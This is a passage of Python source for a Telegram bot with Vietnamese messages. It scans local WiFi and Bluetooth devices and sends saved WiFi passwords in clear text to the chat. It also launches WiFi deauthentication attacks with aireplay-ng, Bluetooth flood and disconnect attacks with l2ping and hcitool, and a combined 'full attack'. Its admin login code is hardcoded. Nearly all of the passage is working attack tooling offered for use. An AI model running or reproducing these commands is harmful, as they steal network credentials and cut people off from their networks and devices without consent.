        interfaces = [{'Name': 'Wi-Fi', 'Description': 'Default WiFi Adapter', 'State': 'connected'}]
    return interfaces
 
def get_device_info_from_mac(mac_address):
    mac = mac_address.replace("-", ":").replace(".", ":").upper().strip()
    oui = mac[:8] if len(mac) >= 8 else mac
    vendors = {
        "F0:18:98": "Apple", "9C:4F:DA": "Apple", "A4:D1:D2": "Apple",
        "A8:88:08": "Apple", "F0:DB:E2": "Apple", "B8:17:C2": "Apple",
        "38:C9:86": "Apple", "A4:B8:05": "Apple", "AC:BC:32": "Apple",
        "F4:0F:24": "Apple", "B0:65:BD": "Apple", "7C:04:D0": "Apple",
        "54:26:96": "Apple", "14:98:77": "Apple", "A4:D1:8C": "Apple",
        "BC:47:60": "Samsung", "CC:3A:61": "Samsung", "00:07:AB": "Samsung",
        "64:A2:F9": "Xiaomi", "8C:BE:BE": "Xiaomi", "F4:DB:E3": "Xiaomi",
        "00:1E:10": "Huawei", "00:25:68": "Huawei", "08:55:31": "Huawei",
        "00:1B:B3": "Oppo", "04:5A:95": "Oppo", "08:70:45": "Oppo",
        "00:1E:68": "Vivo", "04:D4:C4": "Vivo", "08:C5:E1": "Vivo",
        "00:14:22": "Dell", "00:15:C5": "Dell", "00:18:8B": "Dell",
        "00:1B:78": "HP", "00:1E:0B": "HP", "00:21:5A": "HP",
        "00:1A:A0": "Lenovo", "00:1E:4C": "Lenovo", "00:21:6A": "Lenovo",
        "00:1A:A2": "Asus", "00:1E:8C": "Asus", "00:23:54": "Asus",
        "00:1A:11": "Google", "3C:5A:B4": "Google", "54:60:09": "Google",
        "00:01:4A": "Sony", "00:24:BE": "Sony", "08:D4:0C": "Sony",
        "00:1C:7B": "LG", "00:23:6C": "LG", "04:4E:AF": "LG",
        "00:17:E3": "Motorola", "00:1D:FE": "Motorola", "00:25:04": "Motorola",
        "00:1E:68": "Acer", "00:23:8B": "Acer", "00:26:22": "Acer",
    }
    if oui in vendors:
        return vendors[oui]
    return "Unknown"
 
def get_device_model(hostname, mac, vendor):
    hostname = hostname.lower().strip()
    vendor = vendor.lower()
    if vendor == "apple":
        if "iphone" in hostname: return "iPhone (iOS)"
        if "ipad" in hostname: return "iPad"
        if "macbook" in hostname: return "MacBook"
        return "Apple Device"
    if vendor == "samsung":
        return "Samsung Galaxy"
    if vendor == "xiaomi": return "Xiaomi"
    if vendor == "huawei": return "Huawei"
    if vendor == "google": return "Google Pixel"
    if vendor in ["dell", "hp", "lenovo", "asus", "acer"]:
        return f"{vendor} PC/Laptop"
    return f"{vendor} Device"
 
def get_device_icon(vendor, hostname):
    vendor = vendor.lower()
    hostname = hostname.lower()
    if vendor == "apple":
        if "iphone" in hostname: return "📱 iPhone"
        if "ipad" in hostname: return "📱 iPad"
        if "macbook" in hostname: return "💻 MacBook"
        return "🍎 Apple"
    if vendor == "samsung": return "📱 Samsung"
    if vendor in ["xiaomi", "oppo", "vivo", "huawei"]: return "📱 Android"
    if vendor in ["dell", "hp", "lenovo", "asus", "acer"]: return "💻 PC/Laptop"
    if vendor == "google": return "📱 Pixel"
    if vendor == "sony": return "📺 Sony"
    return "📡 Device"
 
def clean_device_name(raw_name):
    if not raw_name:
        return "Unknown"
    raw_name = str(raw_name)
    raw_name = re.sub(r'[^\x20-\x7E\u0100-\u01FF\u1EA0-\u1EFF]', '', raw_name)
    raw_name = raw_name.replace('\n', '').replace('\r', '').replace('\t', ' ')
    raw_name = ' '.join(raw_name.split())
    return raw_name.strip()[:80]
 
def scan_wifi_devices():
    devices = []
    os_type = platform.system()
    try:
        if os_type == "Windows":
            result = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=15)
            for line in result.stdout.split('\n'):
                if 'dynamic' in line.lower() or 'static' in line.lower():
                    parts = line.split()
                    if len(parts) >= 2:
                        ip = parts[0]
                        mac = parts[1].replace("-", ":")
                        devices.append({"ip": ip, "mac": mac, "type": "WiFi", "hostname": ""})
            for d in devices:
                try:
                    res = subprocess.run(["nslookup", d["ip"]], capture_output=True, text=True, timeout=5)
                    for l in res.stdout.split('\n'):
                        if 'Name:' in l:
                            d["hostname"] = l.split('Name:')[1].strip()
                except:
                    pass
        else:
            result = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=15)
            for line in result.stdout.split('\n'):
                if '(' in line and ')' in line and 'at' in line:
                    ip = line.split('(')[1].split(')')[0]
                    mac = line.split('at ')[1].split(' ')[0] if 'at ' in line else 'Unknown'
                    hostname = ""
                    if '?' not in line:
                        try:
                            hostname = line.split('(')[0].strip()
                        except:
                            pass
                    devices.append({"ip": ip, "mac": mac, "type": "WiFi", "hostname": hostname})
    except:
        pass
    return devices
 
def scan_bluetooth_devices():
    devices = []
    os_type = platform.system()
    try:
        if os_type == "Windows":
            result = subprocess.run(
                ["powershell", "-Command", 
                 "Get-PnpDevice -Class Bluetooth | Where-Object {$_.Status -eq 'OK'} | Select-Object Name, InstanceId, Class, FriendlyName | Format-List"],
                capture_output=True, text=True, timeout=25
            )
            current_device = {}
            for line in result.stdout.split('\n'):
                line = line.strip()
                if ':' in line:
                    key, val = line.split(':', 1)
                    key = key.strip()
                    val = val.strip()
                    if key == 'Name' and val:
                        current_device['name'] = val
                    elif key == 'InstanceId' and val:
                        current_device['instance_id'] = val
                        mac_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}', val)
                        if mac_match:
                            current_device['mac'] = mac_match.group(0)
                    elif key == 'FriendlyName' and val:
                        current_device['friendly_name'] = val
                if 'Name' in current_device and line == '':
                    if current_device:
                        devices.append(current_device)
                        current_device = {}
            if current_device:
                devices.append(current_device)
        else:
            try:
                result = subprocess.run(["hcitool", "scan"], capture_output=True, text=True, timeout=20)
                for line in result.stdout.split('\n'):
                    if line.strip() and 'Scanning' not in line:
                        parts = line.strip().split('\t')
                        if len(parts) >= 2:
                            devices.append({"mac": parts[0], "name": parts[1], "type": "Bluetooth"})
            except:
                pass
    except:
        pass
    for d in devices:
        if 'status' not in d:
            d['status'] = "🔵 ĐANG BẬT"
    if not devices:
        devices.append({"name": "Không tìm thấy thiết bị Bluetooth", "type": "Bluetooth", "status": "🔴 TẮT / KHÔNG KHẢ DỤNG", "mac": ""})
    return devices
 
@bot.message_handler(commands=['scanwifi'])
def cmd_scanwifi(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    sent_msg = bot.reply_to(message, "📡 *ĐANG QUÉT THIẾT BỊ WIFI...*\n⏳ Phân tích tên + loại thiết bị...", parse_mode='Markdown')
    devices = scan_wifi_devices()
    if not devices:
        bot.edit_message_text("📭 Không tìm thấy thiết bị nào trong mạng WiFi.", message.chat.id, sent_msg.message_id)
        return
    phone_count = 0
    pc_count = 0
    for d in devices:
        vendor = get_device_info_from_mac(d.get('mac', ''))
        hostname = d.get('hostname', '')
        icon = get_device_icon(vendor, hostname)
        if 'iPhone' in icon or 'Android' in icon or 'Pixel' in icon:
            phone_count += 1
        elif 'PC' in icon or 'MacBook' in icon:
            pc_count += 1
    os_type = platform.system()
    text = f"📡 *QUÉT THIẾT BỊ WIFI ({os_type})*\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"🔍 *Tổng:* `{len(devices)}` thiết bị\n"
    text += f"📱 Điện thoại: `{phone_count}` | 💻 Máy tính: `{pc_count}`\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, d in enumerate(devices[:25], 1):
        mac = d.get('mac', 'N/A')
        vendor = get_device_info_from_mac(mac)
        hostname = d.get('hostname', '')
        model = get_device_model(hostname, mac, vendor)
        icon = get_device_icon(vendor, hostname)
        clean_name = clean_device_name(d.get('hostname', d.get('name', d.get('ip', 'Unknown'))))
        text += f"*{i}. {icon}*\n"
        text += f"   🏷️ *Hãng:* `{vendor}`\n"
        text += f"   📱 *Model:* `{model}`\n"
        text += f"   🌐 *IP:* `{d.get('ip', 'N/A')}`\n"
        text += f"   🔗 *MAC:* `{mac}`\n"
        text += f"   📛 *Tên:* `{clean_name}`\n\n"
    text += f"⏰ *Quét lúc:* `{datetime.now().strftime('%H:%M:%S %d/%m/%Y')}`"
    try:
        if len(text) > 4000:
            bot.edit_message_text(text[:3950] + "\n\n✂️ *Còn tiếp...*", message.chat.id, sent_msg.message_id, parse_mode='Markdown')
        else:
            bot.edit_message_text(text, message.chat.id, sent_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(text[:4000], message.chat.id, sent_msg.message_id)
 
@bot.message_handler(commands=['scanbt'])
def cmd_scanbt(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    sent_msg = bot.reply_to(message, "🔵 *ĐANG QUÉT BLUETOOTH...*\n⏳ Dò tìm + phân tích thiết bị...", parse_mode='Markdown')
    devices = scan_bluetooth_devices()
    bt_on_count = 0
    bt_off_count = 0
    for d in devices:
        if 'BẬT' in d.get('status', ''):
            bt_on_count += 1
        elif 'TẮT' in d.get('status', ''):
            bt_off_count += 1
    text = "🔵 *QUÉT THIẾT BỊ BLUETOOTH NÂNG CẤP*\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"🔍 *Tổng:* `{len(devices)}` thiết bị\n"
    text += f"🔵 BẬT: `{bt_on_count}` | 🔴 TẮT: `{bt_off_count}`\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, d in enumerate(devices[:25], 1):
        name = d.get('name', d.get('friendly_name', 'Unknown'))
        mac = d.get('mac', 'N/A')
        status = d.get('status', '❓')
        vendor = get_device_info_from_mac(mac)
        model = get_device_model(name.lower(), mac, vendor)
        icon = get_device_icon(vendor, name.lower())
        clean_name = clean_device_name(name)
        text += f"*{i}. {icon}*\n"
        text += f"   {status}\n"
        text += f"   🏷️ *Hãng:* `{vendor}`\n"
        text += f"   📱 *Model:* `{model}`\n"
        text += f"   📛 *Tên:* `{clean_name}`\n"
        text += f"   🔗 *MAC:* `{mac}`\n\n"
    text += f"⏰ *Quét lúc:* `{datetime.now().strftime('%H:%M:%S %d/%m/%Y')}`"
    try:
        if len(text) > 4000:
            bot.edit_message_text(text[:3950] + "\n\n✂️ *Còn tiếp...*", message.chat.id, sent_msg.message_id, parse_mode='Markdown')
        else:
            bot.edit_message_text(text, message.chat.id, sent_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(text[:4000], message.chat.id, sent_msg.message_id)
 
@bot.message_handler(commands=['wifiscan'])
def cmd_wifiscan(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    sent_msg = bot.reply_to(message, "📡 *ĐANG QUÉT MẠNG WIFI XUNG QUANH...*", parse_mode='Markdown')
    os_type = platform.system()
    networks = []
    try:
        if os_type == "Windows":
            result = subprocess.run(
                ["netsh", "wlan", "show", "networks", "mode=Bssid"],
                capture_output=True, text=True, timeout=20
            )
            current_ssid = None
            current_auth = None
            current_signal = None
            for line in result.stdout.split('\n'):
                line = line.strip()
                if "SSID" in line and ":" in line and "BSSID" not in line:
                    if current_ssid and current_ssid != "":
                        networks.append({"ssid": current_ssid, "auth": current_auth or "Unknown", "signal": current_signal or "N/A"})
                    try:
                        current_ssid = line.split(":", 1)[1].strip()
                    except:
                        current_ssid = "Hidden"
                    current_auth = None
                    current_signal = None
                elif "Authentication" in line and ":" in line:
                    current_auth = line.split(":", 1)[1].strip()
                elif "Signal" in line and ":" in line:
                    try:
                        current_signal = line.split(":", 1)[1].strip().replace("%", "")
                    except:
                        pass
            if current_ssid and current_ssid != "":
                networks.append({"ssid": current_ssid, "auth": current_auth or "Unknown", "signal": current_signal or "N/A"})
        else:
            try:
                result = subprocess.run(
                    ["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY", "device", "wifi", "list"],
                    capture_output=True, text=True, timeout=15
                )
                for line in result.stdout.split('\n'):
                    if ':' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            networks.append({
                                "ssid": parts[0] if parts[0] else "Hidden",
                                "signal": parts[1] if len(parts) > 1 else "N/A",
                                "auth": parts[2] if len(parts) > 2 else "Unknown"
                            })
            except:
                pass
    except:
        pass
    if not networks:
        bot.edit_message_text("📭 Không tìm thấy mạng WiFi nào.", message.chat.id, sent_msg.message_id)
        return
    networks = [dict(t) for t in {tuple(d.items()) for d in networks}]
    text = f"📡 *QUÉT MẠNG WIFI ({os_type})*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"🔍 *Tìm thấy:* `{len(networks)}` mạng WiFi\n\n"
    for i, net in enumerate(networks[:30], 1):
        ssid = net.get('ssid', 'Hidden')
        auth = net.get('auth', 'Unknown')
        signal_str = net.get('signal', '0')
        try:
            signal_val = int(signal_str.replace('%', ''))
        except:
            signal_val = 0
        if signal_val >= 80:
            signal_icon = "▂▄▆█"
        elif signal_val >= 60:
            signal_icon = "▂▄▆_"
        elif signal_val >= 40:
            signal_icon = "▂▄__"
        else:
            signal_icon = "▂___"
        iconss = "🔒" if auth != "Unknown" and auth != "Open" and auth != "" else "🔓"
        text += f"*{i}. {iconss} {ssid[:40]}*\n"
        text += f"   📶 Tín hiệu: `{signal_val}%` {signal_icon}\n"
        text += f"   🛡️ Bảo mật: `{auth}`\n\n"
    text += f"⏰ *Quét lúc:* `{datetime.now().strftime('%H:%M:%S %d/%m/%Y')}`"
    try:
        bot.edit_message_text(text[:4000], message.chat.id, sent_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(text[:4000], message.chat.id, sent_msg.message_id)
 
@bot.message_handler(commands=['wifipass'])
def cmd_wifipass(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    sent_msg = bot.reply_to(message, "🔑 *ĐANG LẤY MẬT KHẨU WIFI ĐÃ LƯU...*", parse_mode='Markdown')
    os_type = platform.system()
    passwords = []
    try:
        if os_type == "Windows":
            result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, timeout=15)
            ssids = []
            for line in result.stdout.split('\n'):
                if ":" in line and "All User Profile" in line:
                    try:
                        ssid = line.split(":", 1)[1].strip()
                        ssids.append(ssid)
                    except:
                        pass
            for ssid in ssids:
                try:
                    res = subprocess.run(
                        ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
                        capture_output=True, text=True, timeout=10
                    )
                    password = None
                    auth_type = "Unknown"
                    for line in res.stdout.split('\n'):
                        if "Key Content" in line and ":" in line:
                            password = line.split(":", 1)[1].strip()
                        if "Authentication" in line and ":" in line:
                            auth_type = line.split(":", 1)[1].strip()
                    passwords.append({
                        "ssid": ssid,
                        "password": password or "Không có mật khẩu / Open",
                        "auth": auth_type
                    })
                except:
                    pass
        else:
            try:
                result = subprocess.run(
                    ["nmcli", "-t", "-f", "NAME,TYPE", "connection", "show"],
                    capture_output=True, text=True, timeout=10
                )
                connections = []
                for line in result.stdout.split('\n'):
                    if ':802-11-wireless:' in line or ':wifi:' in line.lower():
                        conn_name = line.split(':')[0]
                        connections.append(conn_name)
                for conn in connections:
                    try:
                        res = subprocess.run(
                            ["nmcli", "-s", "-g", "802-11-wireless-security.psk", "connection", "show", conn],
                            capture_output=True, text=True, timeout=10
                        )
                        password = res.stdout.strip()
                        passwords.append({
                            "ssid": conn,
                            "password": password or "Không có mật khẩu / Open",
                            "auth": "WPA/WPA2"
                        })
                    except:
                        pass
            except:
                pass
    except:
        pass
    if not passwords:
        bot.edit_message_text("📭 Không tìm thấy mật khẩu WiFi đã lưu.", message.chat.id, sent_msg.message_id)
        return
    text = f"🔑 *MẬT KHẨU WIFI ĐÃ LƯU ({os_type})*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"🔍 *Tìm thấy:* `{len(passwords)}` mạng WiFi\n\n"
    for i, p in enumerate(passwords[:30], 1):
        text += f"*{i}. 📶 {p['ssid'][:40]}*\n"
        text += f"   🔑 *Pass:* `{p['password']}`\n"
        text += f"   🛡️ *Bảo mật:* `{p['auth']}`\n\n"
    text += f"⏰ *Lấy lúc:* `{datetime.now().strftime('%H:%M:%S %d/%m/%Y')}`"
    try:
        bot.edit_message_text(text[:4000], message.chat.id, sent_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(text[:4000], message.chat.id, sent_msg.message_id)
 
@bot.message_handler(commands=['wifilist'])
def cmd_wifilist(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    os_type = platform.system()
    interfaces = []
    if os_type == "Windows":
        interfaces = detect_wifi_interfaces_windows()
    else:
        try:
            result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=10)
            current = {}
            for line in result.stdout.split('\n'):
                if line and not line.startswith(' '):
                    if current and 'name' in current:
                        interfaces.append(current)
                    current = {'name': line.split()[0]}
                elif current and 'ESSID' in line:
                    current['ssid'] = line.split('ESSID:')[1].strip().strip('"')
                elif current and 'Mode' in line:
                    current['mode'] = line.split('Mode:')[1].split()[0]
            if current and 'name' in current:
                interfaces.append(current)
        except:
            pass
    if not interfaces:
        bot.reply_to(message, "📭 Không tìm thấy card WiFi nào!")
        return
    text = f"📡 *DANH SÁCH CARD WIFI ({os_type})*\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, iface in enumerate(interfaces, 1):
        name = iface.get('Name', iface.get('name', 'Unknown'))
        desc = iface.get('Description', '')
        state = iface.get('State', iface.get('mode', 'unknown'))
        text += f"*{i}. {name}*\n"
        if desc:
            text += f"   📝 Mô tả: `{desc}`\n"
        text += f"   📶 Trạng thái: `{state}`\n\n"
    bot.reply_to(message, text, parse_mode='Markdown')
 
def detect_bluetooth_adapter():
    os_type = platform.system()
    adapters = []
    try:
        if os_type == "Windows":
            result = subprocess.run(
                ["powershell", "-Command", "Get-PnpDevice -Class Bluetooth | Where-Object {$_.Status -eq 'OK'} | Select-Object Name, InstanceId, FriendlyName | Format-List"],
                capture_output=True, text=True, timeout=15
            )
            current = {}
            for line in result.stdout.split('\n'):
                if ':' in line:
                    key, val = line.split(':', 1)
                    key = key.strip()
                    val = val.strip()
                    if key == 'Name':
                        if current and 'Name' in current:
                            adapters.append(current)
                        current = {'Name': val}
                    elif key == 'FriendlyName' and current:
                        current['FriendlyName'] = val
                    elif key == 'InstanceId' and current:
                        current['InstanceId'] = val
            if current and 'Name' in current:
                adapters.append(current)
        else:
            result = subprocess.run(["hcitool", "dev"], capture_output=True, text=True, timeout=10)
            for line in result.stdout.split('\n'):
                if line.strip() and 'Devices:' not in line:
                    parts = line.strip().split('\t')
                    if len(parts) >= 2:
                        adapters.append({'Name': parts[1].strip(), 'MAC': parts[0].strip()})
    except:
        pass
    return adapters
 
@bot.message_handler(commands=['btlist'])
def cmd_btlist(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    adapters = detect_bluetooth_adapter()
    if not adapters:
        bot.reply_to(message, "📭 Không tìm thấy Bluetooth adapter nào!")
        return
    os_type = platform.system()
    text = f"🔵 *DANH SÁCH BLUETOOTH ADAPTER ({os_type})*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, ad in enumerate(adapters, 1):
        text += f"*{i}. {ad.get('FriendlyName', ad.get('Name', 'Unknown'))}*\n"
        if 'MAC' in ad:
            text += f"   🔗 MAC: `{ad['MAC']}`\n\n"
    bot.reply_to(message, text, parse_mode='Markdown')
 
# ==================== WIFI DEAUTH ====================
def run_deauth_windows(chat_id, interface, target_mac, ap_mac, channel):
    count = 0
    while chat_id in active_deauth and active_deauth[chat_id].get('active', False):
        try:
            subprocess.run(["netsh", "wlan", "disconnect", f"interface={interface}"], capture_output=True, timeout=3)
            count += 50
            active_deauth[chat_id]['count'] = count
            time.sleep(0.02)
        except:
            time.sleep(0.1)
 
def run_deauth_linux(chat_id, interface, target_mac, ap_mac, channel):
    count = 0
    if channel:
        try:
            subprocess.run(["iwconfig", interface, "channel", str(channel)], capture_output=True, timeout=3)
        except:
            pass
    while chat_id in active_deauth and active_deauth[chat_id].get('active', False):
        try:
            if target_mac == "FF:FF:FF:FF:FF:FF":
                cmd = ["aireplay-ng", "-0", "20", "-a", ap_mac, "--ignore-negative-one", interface]
            else:
                cmd = ["aireplay-ng", "-0", "20", "-a", ap_mac, "-c", target_mac, "--ignore-negative-one", interface]
            subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            count += 20
            active_deauth[chat_id]['count'] = count
            time.sleep(0.05)
        except:
            time.sleep(0.5)
 
@bot.message_handler(commands=['deauth'])
def cmd_deauth(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    chat_id = message.chat.id
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, """
📡 *WIFI DEAUTH*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`/deauth <interface> <target_mac> <ap_mac> [channel]`
`/deauth <interface> <ap_mac> all [channel]`
🛑 */stopdeauth* - Dừng
        """, parse_mode='Markdown')
        return
    interface = args[1]
    ap_mac = args[2]
    if len(args) >= 4 and args[3].lower() == "all":
        target_mac = "FF:FF:FF:FF:FF:FF"
    else:
        target_mac = args[3] if len(args) >= 4 else "FF:FF:FF:FF:FF:FF"
    channel = None
    if len(args) >= 5:
        try:
            channel = int(args[4])
        except:
            pass
    os_type = platform.system()
    sent_msg = bot.reply_to(message, f"📡 *ĐANG TẤN CÔNG DEAUTH...*\n🎯 Target: `{target_mac}`\n📶 AP: `{ap_mac}`", parse_mode='Markdown')
    with deauth_lock:
        if chat_id in active_deauth:
            active_deauth[chat_id]['active'] = False
            time.sleep(0.5)
        active_deauth[chat_id] = {
            'active': True,
            'thread': threading.Thread(target=run_deauth_windows if os_type == "Windows" else run_deauth_linux, args=(chat_id, interface, target_mac, ap_mac, channel), daemon=True),
            'target': target_mac,
            'ap': ap_mac,
            'start_time': time.time(),
            'count': 0
        }
        active_deauth[chat_id]['thread'].start()
    bot.edit_message_text(f"✅ *DEAUTH ĐANG CHẠY!*\n🎯 Target: `{target_mac}`\n🛑 Dừng: /stopdeauth", chat_id, sent_msg.message_id, parse_mode='Markdown')
 
@bot.message_handler(commands=['stopdeauth'])
def cmd_stopdeauth(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    chat_id = message.chat.id
    if chat_id not in active_deauth or not active_deauth[chat_id].get('active', False):
        bot.reply_to(message, "ℹ️ Không có deauth nào đang chạy!")
        return
    active_deauth[chat_id]['active'] = False
    count = active_deauth[chat_id].get('count', 0)
    duration = int(time.time() - active_deauth[chat_id].get('start_time', time.time()))
    del active_deauth[chat_id]
    bot.reply_to(message, f"🛑 *ĐÃ DỪNG DEAUTH*\n📨 Gói đã gửi: `{count}`\n⏱️ Thời gian: `{duration}s`", parse_mode='Markdown')
 
# ==================== BLUETOOTH DEAUTH ====================
def bt_deauth_linux(chat_id, target_mac, adapter, intensity=200):
    count = 0
    while chat_id in active_bt_deauth and active_bt_deauth[chat_id].get('active', False):
        try:
            if target_mac:
                subprocess.run(["l2ping", "-i", adapter, "-s", "600", "-f", target_mac], capture_output=True, timeout=2)
                count += 10
            else:
                bt_devices_linux = []
                try:
                    scan = subprocess.run(["hcitool", "scan", "--flush"], capture_output=True, text=True, timeout=5)
                    for line in scan.stdout.split('\n'):
                        parts = line.strip().split('\t')
                        if len(parts) >= 2 and ':' in parts[0]:
                            bt_devices_linux.append(parts[0])
                except:
                    pass
                for dev in bt_devices_linux[:5]:
                    try:
                        subprocess.run(["l2ping", "-i", adapter, "-s", "600", "-c", "5", dev], capture_output=True, timeout=2)
                        count += 5
                    except:
                        pass
            active_bt_deauth[chat_id]['count'] = count
            time.sleep(0.05)
        except:
            time.sleep(0.5)
 
@bot.message_handler(commands=['btdeauth'])
def cmd_btdeauth(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    chat_id = message.chat.id
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, """
🔵 *BLUETOOTH DEAUTH*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`/btdeauth <target_mac> [adapter] [packets/s]`
`/btdeauth all [adapter]`
🛑 */stopbt* - Dừng
        """, parse_mode='Markdown')
        return
    target = args[1]
    target_mac = target.upper() if target.lower() != "all" else None
    adapters = detect_bluetooth_adapter()
    if not adapters:
        bot.reply_to(message, "❌ Không tìm thấy Bluetooth adapter!")
        return
    adapter = adapters[0].get('MAC', 'hci0')
    if len(args) >= 3:
        for ad in adapters:
            if args[2].lower() in ad.get('Name', '').lower() or args[2].lower() in ad.get('MAC', '').lower():
                adapter = ad.get('MAC', 'hci0')
                break
    packets_per_sec = 100
    if len(args) >= 4:
        try:
            packets_per_sec = int(args[3])
        except:
            pass
    with bt_deauth_lock:
        if chat_id in active_bt_deauth:
            active_bt_deauth[chat_id]['active'] = False
            time.sleep(0.5)
        active_bt_deauth[chat_id] = {
            'active': True,
            'thread': threading.Thread(target=bt_deauth_linux, args=(chat_id, target_mac, adapter, packets_per_sec), daemon=True),
            'target': target_mac,
            'adapter': adapter,
            'start_time': time.time(),
            'count': 0
        }
        active_bt_deauth[chat_id]['thread'].start()
    bot.reply_to(message, f"✅ *BLUETOOTH ATTACK ĐANG CHẠY!*\n🎯 Target: `{target_mac or 'ALL'}`\n🛑 Dừng: /stopbt", parse_mode='Markdown')
 
@bot.message_handler(commands=['btlock'])
def cmd_btlock(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    chat_id = message.chat.id
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "🔒 *BT LOCK*\n`/btlock <MAC> [thời_gian_giây]`\n🛑 */stopbt* - Dừng", parse_mode='Markdown')
        return
    target_mac = args[1].upper()
    duration = 60
    if len(args) >= 3:
        try:
            duration = int(args[2])
        except:
            pass
    adapters = detect_bluetooth_adapter()
    adapter = adapters[0].get('MAC', 'hci0') if adapters else 'hci0'
    bot.reply_to(message, f"🔒 *ĐANG KHÓA THIẾT BỊ {target_mac}*\n⏱️ Thời gian: {duration}s", parse_mode='Markdown')
    def lock_device():
        end_time = time.time() + duration
        count = 0
        while time.time() < end_time:
            try:
                subprocess.run(["l2ping", "-i", adapter, "-s", "600", "-f", target_mac], capture_output=True, timeout=1)
                count += 50
                time.sleep(0.02)
                subprocess.run(["hcitool", "dc", target_mac], capture_output=True, timeout=2)
            except:
                time.sleep(0.1)
        bot.send_message(chat_id, f"🔓 *ĐÃ MỞ KHÓA {target_mac}*\n📨 Gói đã gửi: `{count}`\n✅ Thiết bị có thể reconnect", parse_mode='Markdown')
    threading.Thread(target=lock_device, daemon=True).start()
 
@bot.message_handler(commands=['stopbt'])
def cmd_stopbt(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    chat_id = message.chat.id
    if chat_id not in active_bt_deauth or not active_bt_deauth[chat_id].get('active', False):
        bot.reply_to(message, "ℹ️ Không có Bluetooth attack nào đang chạy!")
        return
    active_bt_deauth[chat_id]['active'] = False
    count = active_bt_deauth[chat_id].get('count', 0)
    duration = int(time.time() - active_bt_deauth[chat_id].get('start_time', time.time()))
    del active_bt_deauth[chat_id]
    bot.reply_to(message, f"🛑 *ĐÃ DỪNG BLUETOOTH ATTACK*\n📨 Gói đã gửi: `{count}`\n⏱️ Thời gian: `{duration}s`", parse_mode='Markdown')
 
# ==================== FULL ATTACK ====================
@bot.message_handler(commands=['fullattack'])
def cmd_fullattack(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    chat_id = message.chat.id
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "💀 *FULL ATTACK*\n`/fullattack <ap_mac> [target_mac] [thời_gian]`\n`/fullattack all [thời_gian]`\n🛑 */stopall* - Dừng", parse_mode='Markdown')
        return
    ap_mac = args[1]
    target_mac = "FF:FF:FF:FF:FF:FF"
    if len(args) >= 3 and args[2].lower() != "all":
        target_mac = args[2].upper()
    duration = 0
    if len(args) >= 4:
        try:
            duration = int(args[3])
        except:
            pass
    os_type = platform.system()
    wifi_interface = "Wi-Fi"
    if os_type == "Windows":
        interfaces = detect_wifi_interfaces_windows()
        if interfaces:
            wifi_interface = interfaces[0].get('Name', 'Wi-Fi')
    else:
        try:
            result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    wifi_interface = line.split()[0]
                    break
        except:
            wifi_interface = "wlan0"
    bt_adapters = detect_bluetooth_adapter()
    bt_adapter = bt_adapters[0].get('MAC', 'hci0') if bt_adapters else None
    bot.reply_to(message, f"💀 *FULL ATTACK ĐANG KÍCH HOẠT!*\n📡 WiFi: `{wifi_interface}`\n🔵 BT: `{bt_adapter or 'Không có'}`\n🎯 Target: `{target_mac}`\n⏱️ Duration: `{duration}s`", parse_mode='Markdown')
    with deauth_lock:
        if chat_id in active_deauth:
